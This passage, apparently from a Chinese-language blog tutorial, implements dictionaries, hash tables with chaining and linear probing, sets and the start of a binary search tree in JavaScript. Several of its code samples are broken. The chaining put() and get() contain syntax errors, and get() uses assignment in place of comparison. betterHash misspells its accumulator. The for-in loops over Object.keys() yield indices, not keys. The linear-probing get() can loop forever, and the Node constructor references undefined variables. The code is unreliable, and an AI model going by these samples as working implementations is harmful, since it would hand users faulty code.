<p>find方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.datastore[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>删除方法需要使用JavaScript中的一个内置函数：delete。该函数是Object类的一部分，使用对键的引用作为参数。该函数同时删除掉键和与其关联的值。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> <span class="keyword">this</span>.datastore[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>显示字典中所有的键-值对<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showAll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> <span class="built_in">Object</span>.keys(<span class="keyword">this</span>.datastore)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(key + <span class="string">' -&gt; '</span> + <span class="keyword">this</span>.datastore[key]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调用Object类的keys方法可以返回传入参数中存储的所有键。</p>
<h2 id="Dictionary类的辅助方法"><a href="#Dictionary类的辅助方法" class="headerlink" title="Dictionary类的辅助方法"></a>Dictionary类的辅助方法</h2><p>count方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> <span class="built_in">Object</span>.keys(<span class="keyword">this</span>.datastore)) &#123;</span><br><span class="line">        ++n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当键的类型为字符串时，length属性就不管用了。请看例子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nums1 = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">nums1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">nums1[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(nums1.length);<span class="comment">// 2</span></span><br><span class="line"><span class="keyword">var</span> nums2 = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">nums2[<span class="string">'a'</span>] = <span class="number">1</span>;</span><br><span class="line">nums2[<span class="string">'b'</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(nums2.length);<span class="comment">// 0</span></span><br></pre></td></tr></table></figure></p>
<p>clear方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> <span class="built_in">Object</span>.keys(<span class="keyword">this</span>.datastore)) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.datastore[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="为Dictionary类添加排序功能"><a href="#为Dictionary类添加排序功能" class="headerlink" title="为Dictionary类添加排序功能"></a>为Dictionary类添加排序功能</h2><p>我们无需太关心数据在字典中的实际存储顺序，然而，很多人都希望看到一个有序的字典。<br>重新定义showAll方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showAll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> <span class="built_in">Object</span>.keys(<span class="keyword">this</span>.datastore).sort()) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(key + <span class="string">" -&gt; "</span> + <span class="keyword">this</span>.datastore[key]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="散列"><a href="#散列" class="headerlink" title="散列"></a>散列</h1><p>散列后的数据可以快速地插入或取用。散列使用的数据结构叫做散列表。在散列表上插入、删除和取用数据都非常快，但是对于查找操作来说却效率低下，比如查找一组数据中的最大值和最小值。</p>
<h2 id="散列概览"><a href="#散列概览" class="headerlink" title="散列概览"></a>散列概览</h2><p>我们的散列表是基于数组进行设计的。数组的长度是预先设定的，如有需要，可以随时增加。所有元素根据和该元素对应的键，保存在数组的特定位置。使用散列表存储数据时，通过一个散列函数将键映射为一个数字，这个数字的范围是0到散列表的长度。</p>
<p>理想情况下，散列函数会将每个键值映射为一个唯一的数组索引。然而，键的数量是无限的，数组的长度是有限的，一个更现实的目标是让散列函数尽量将键均匀地映射到数组中。</p>
<p>将两个键映射成同一值，这种现象称为碰撞。我们稍后会讨论如何解决。</p>
<p>要确定的最后一个问题是：散列表中的数组究竟应该有多大？对数组大小常见的限制是：数组长度应该是一个质数。下图阐释了散列的概念<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/9.jpg" alt="avatar"></p>
<h2 id="HashTable类"><a href="#HashTable类" class="headerlink" title="HashTable类"></a>HashTable类</h2><p>构造函数定义如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HashTable</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.table = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">137</span>);</span><br><span class="line">    <span class="keyword">this</span>.simpleHash = simpleHash;</span><br><span class="line">    <span class="keyword">this</span>.showDistro = showDistro;</span><br><span class="line">    <span class="keyword">this</span>.put = put;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="选择一个散列函数"><a href="#选择一个散列函数" class="headerlink" title="选择一个散列函数"></a>选择一个散列函数</h2><p>散列函数的选择依赖于键值的数据类型。如果键是整型，最简单的散列函数就是以数组的长度对键取余。在一些情况下，比如数组的长度是10，而键值都是10的倍数，就不推荐使用这种方式了。这也是数组的长度为什么要是质数的原因之一，就像我们在上个构造函数中，设定数组的长度为137一样。如果键是随机的整数，则散列函数应该更均匀地分布这些键。这种散列方式称为<code>除留余数法</code>.</p>
<p>选择针对字符串类型的散列函数就比较难了，乍一看将字符串中每个字符的ASCII码值相加似乎是一个不错的散列函数。这样散列值就是ASCII码值的和除以数组长度的余数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">simpleHash</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; ++i) &#123;</span><br><span class="line">        total += data.charCodeAt(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total % <span class="keyword">this</span>.table.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>put()<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="keyword">this</span>.simpleHash(data);</span><br><span class="line">    <span class="keyword">this</span>.table[pos] = data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>showDistro()<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showDistro</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.table.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.table[i] != <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i + <span class="string">": "</span> + <span class="keyword">this</span>.table[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>你会发现，数据并不是均匀分布的，人名向数组的两端集中。还有一个更严重的问题，由于散列值发生了碰撞，初始数组中的人名并没有全部显示。</p>
<h2 id="一个更好的散列函数"><a href="#一个更好的散列函数" class="headerlink" title="一个更好的散列函数"></a>一个更好的散列函数</h2><p>首先要确保散列表中用来存储数据的数组其大小是一个质数。我们取了不会让上例发生碰撞的最小质数137。<br>接下来要有一个计算散列值的更好方法。霍纳算法很好地解决了这个问题。在此算法中，新的散列函数仍然先计算字符串中各字符的ASCII码值，不过求和时每次都要乘以一个质数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">betterHash</span>(<span class="params">string, arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> H = <span class="number">37</span>;</span><br><span class="line">    <span class="keyword">var</span> tatal = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; string.length; ++i) &#123;</span><br><span class="line">        total += H * total + string.charCodeAt(i);</span><br><span class="line">    &#125;</span><br><span class="line">    total = total % arr.length;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(total);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="对散列表排序、从散列表中取值"><a href="#对散列表排序、从散列表中取值" class="headerlink" title="对散列表排序、从散列表中取值"></a>对散列表排序、从散列表中取值</h2><p>修改put方法，使得该方法同时接受建和数据作为参数。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params">key, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="keyword">this</span>.betterHash(key);</span><br><span class="line">    <span class="keyword">this</span>.table[pos] = data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>get方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.table[<span class="keyword">this</span>.betterHash(key)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="碰撞处理-开链法"><a href="#碰撞处理-开链法" class="headerlink" title="碰撞处理-开链法"></a>碰撞处理-开链法</h2><p>开链法是指实现散列表的底层数组中，每个数组元素又是一个新的数据结构，比如另一个数组，这样就能存储多个键了。使用这种技术，即使两个键散列后的值相同，依然被保存在同样的位置，只不过它们在第二个数组中的位置不一样罢了。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/10.jpg" alt="avatar"><br>实现开链法的方法是：在创建存储散列过的键值的数组时，通过调用一个函数创建一个新的空数组，然后将该数组赋给散列表里的每个数组元素。这样就创建了一个二维数组，我们也称这个数组为链。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildChains</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.table.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">this</span>.table[i] = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将上述代码和函数声明加入HashTable类。使用前先调用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hTable = <span class="keyword">new</span> HashTable();</span><br><span class="line">hTable.buildChains();</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>showDistro修改<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showDistro</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.table.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.table[i][<span class="number">0</span>] != <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i + <span class="string">": "</span> + <span class="keyword">this</span>.table[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>put方法修改<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params">key, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="keyword">this</span>.betterHash(key);</span><br><span class="line">    <span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.table[pos][index] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.table[pos][index+<span class="number">1</span>] = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ++index;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">this</span>.table[pos][index] != <span class="literal">undefined</span>) &#123;</span><br><span class="line">            ++index;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.table[pos][index+<span class="number">1</span>] = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>前面的例子只保存数据，新的put方法则不同，它即保存数据，也保存键值。该方法使用链中两个连续的单元格，第一个用来保存键值，第二个用来保存数据。<br>get方法修改<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> hash = <span class="keyword">this</span>.betterHash(key);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.table[hash][index] = key) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.table[hash][index+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    index += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">this</span>.table[hash][index] != key) &#123;</span><br><span class="line">            index += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.table[hash][index+<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h2><p>线性探测法隶属于一种更一般化的散列技术：开放寻址散列。当发生碰撞时，线性探测法检查散列表中的下一个位置是否为空。如果为空，就将数据存入该位置；如果不为空，则继续检查下一个位置，直到找到一个空的位置为止。该技术基于一个事实：每个散列表都会有很多空的单元格，可以使用它们来存储数据。如果数组的大小是待存储数据的两倍及两倍以上时，那么使用线性探测法比较好。<br>为了实现一个真实的数据存取系统，需要为HashTable类增加一个新的数组，用来存储数据。数组table和values并行工作，当将一个键值保存到数组table中时，将数据存入数组values中相应的位置上。<br>在构造函数中加入：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.values = [];</span><br></pre></td></tr></table></figure></p>
<p>在put方法中使用线性探测技术<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params">key, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="keyword">this</span>.betterHash(key);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.table[pos] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.table[pos] = key;</span><br><span class="line">        <span class="keyword">this</span>.values[pos] = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">this</span>.table[pos] != <span class="literal">undefined</span>) &#123;</span><br><span class="line">            pos++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.table[pos] = key;</span><br><span class="line">        <span class="keyword">this</span>.values[pos] = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>get方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> hash = <span class="number">-1</span>;</span><br><span class="line">    hash = <span class="keyword">this</span>.betterHash(key);</span><br><span class="line">    <span class="keyword">if</span> (hash &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = hash; <span class="keyword">this</span>.table[hash] != <span class="literal">undefined</span>; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.table[hash] == key) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.values[hash];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p>集合(set)是一种包含不同元素的数据结构。集合中的元素称为成员。集合的两个最重要的特性是：首先，集合中的成员是无序的；其次，集合中不允许相同成员存在。</p>
<h2 id="集合的定义、操作和属性"><a href="#集合的定义、操作和属性" class="headerlink" title="集合的定义、操作和属性"></a>集合的定义、操作和属性</h2><p>集合是由一组无序但彼此之间又有一定相关性的成员构成的，每个成员在集合中只能出行一次。</p>
<h2 id="集合的定义"><a href="#集合的定义" class="headerlink" title="集合的定义"></a>集合的定义</h2><ol>
<li>不包含任何成员的集合称为空集，全集则是包含一切可能成员的集合。</li>
<li>如果两个集合的成员完全相同，则称两个集合相等。</li>
<li>如果一个集合中所有的成员都属于另外一个集合，则前一集合称为后一集合的子集。</li>
</ol>
<h2 id="对集合的操作"><a href="#对集合的操作" class="headerlink" title="对集合的操作"></a>对集合的操作</h2><ol>
<li><p>并集<br>将两个集合中的成员进行合并，得到一个新集合</p>
</li>
<li><p>交集<br>两个集合中共同存在的成员组成一个新的集合</p>
</li>
<li><p>补集<br>属于一个集合而不属于另一个集合的成员组成的集合</p>
</li>
</ol>
<h2 id="Set类的实现"><a href="#Set类的实现" class="headerlink" title="Set类的实现"></a>Set类的实现</h2><p>构造函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Set</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataStore = [];</span><br><span class="line">    <span class="keyword">this</span>.add = add;</span><br><span class="line">    <span class="keyword">this</span>.remove = remove;</span><br><span class="line">    <span class="keyword">this</span>.size = size;</span><br><span class="line">    <span class="keyword">this</span>.union = union;</span><br><span class="line">    <span class="keyword">this</span>.intersect = intersect;</span><br><span class="line">    <span class="keyword">this</span>.subset = subset;</span><br><span class="line">    <span class="keyword">this</span>.difference = difference;</span><br><span class="line">    <span class="keyword">this</span>.show = show;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>add方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore.indexOf(data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.dataStore.push(data);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>remove方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="keyword">this</span>.dataStore.indexOf(data);</span><br><span class="line">    <span class="keyword">if</span> (pos &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.dataStore.splice(pos, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>show方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="更多集合操作"><a href="#更多集合操作" class="headerlink" title="更多集合操作"></a>更多集合操作</h2><p>contains方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">contains</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.dataStore.indexOf(data) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>union方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">union</span>(<span class="params">set</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tempSet = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        tempSet.add(<span class="keyword">this</span>.dataStore[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">set</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!tempSet.contains(<span class="keyword">set</span>.dataStore[i])) &#123;</span><br><span class="line">            tempSet.dataStore.push(<span class="keyword">set</span>.dataStore[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return tempSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>intersect方法求两个集合的交集。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">intersect</span>(<span class="params">set</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tempSet = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">set</span>.contains(this.dataStore[i])) &#123;</span><br><span class="line">            tempSet.add(<span class="keyword">this</span>.dataStore[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tempSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>subset(子集)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">subset</span>(<span class="params">set</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.size() &gt; <span class="keyword">set</span>.size()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> member <span class="keyword">in</span> <span class="keyword">this</span>.dataStore) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">set</span>.contains(member)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>size方法定义如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.dataStore.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>difference方法返回的是一个新集合，该集合包含那些属于第一个集合但不属于第二个集合的成员。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">difference</span>(<span class="params">set</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tempSet = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.dataStore.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">set</span>.contains(this.dataStore[i])) &#123;</span><br><span class="line">            tempSet.add(<span class="keyword">this</span>.dataStore[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tempSet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="二叉树和二叉查找树"><a href="#二叉树和二叉查找树" class="headerlink" title="二叉树和二叉查找树"></a>二叉树和二叉查找树</h1><p>树是一种非线性的数据结构，以分层的方式存储数据。树被用来存储具有层级关系的数据，比如文件系统中的文件；树还被用来存储有序列表。本章研究一种特殊的树：二叉树。在二叉树上进行查找非常快（在链表上查找则不是），为二叉树添加或删除元素也非常快（对数组执行添加或删除操作则不是）。</p>
<h2 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h2><p>树由一组以边连接的节点组成。公司的组织结构图就是一个例子<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/11.jpg" alt="avatar"></p>
<p>每个方框都是一个节点，连接方框的线叫做边。节点代表了该组织中的各个职位，边描述了各职位间的关系。</p>
<p>下图展示了更多关于树的术语，一棵树最上面的节点称为根节点，如果一个节点下面连接多个节点，那么该节点称为父节点，它下面的节点称为子节点。没有任何子节点的节点称为叶子节点。<br><img src="https://mfaying.github.io/static/images/data-structure-and-algorithms-javascript-desc/12.jpg" alt="avatar"><br>二叉树是一种特殊的树，它的子节点个数不超过两个。</p>
<p>沿着一组特定的边，可以从一个节点走到另外一个与它不直接相连的节点。从一个节点到另一个节点的这一组边称为路径，在图中用虚线表示。以某种特定顺序访问树中所有的节点称为树的遍历。</p>
<p>树可以分为几个层次，根节点是第0层，它的子节点是第1层，子节点的子节点是第2层，以此类推。树中任何一层的节点可以都看作是子树的根，该子树包含根节点的子节点，子节点的子节点等。我们定义树的层数就是树的深度。</p>
<p>最后，每个节点都有一个与之相关的值，该值有时被称作键。</p>
<h2 id="二叉树和二叉查找树-1"><a href="#二叉树和二叉查找树-1" class="headerlink" title="二叉树和二叉查找树"></a>二叉树和二叉查找树</h2><p>二叉树每个节点的子节点不允许超过两个。通过将子节点的个数限定为2，可以写出高效的程序在树中插入、查找和删除数据。</p>
<p>一个父节点的两个子节点分别称为左节点和右节点。在一些二叉树的实现中，左节点包含一组特定的值，右节点包含另一组特定的值。</p>
<p>当考虑某种特殊的二叉树，比如二叉查找树时，确定子节点非常重要。二叉查找树是一种特殊的二叉树，相对较小的值保存在左节点中，较大的值保存在右节点中。这一个特性使得查找的效率很高，对于数值型和非数值型的数据，比如单词和字符串，都是如此。</p>
<h2 id="实现二叉查找树"><a href="#实现二叉查找树" class="headerlink" title="实现二叉查找树"></a>实现二叉查找树</h2><p>Node类<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data = data;</span><br><span class="line">    <span class="keyword">this</span>.left = left;</span><br><span class="line">    <span class="keyword">this</span>.right = right;</span><br><span class="line">    <span class="keyword">this</span>.show = show;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
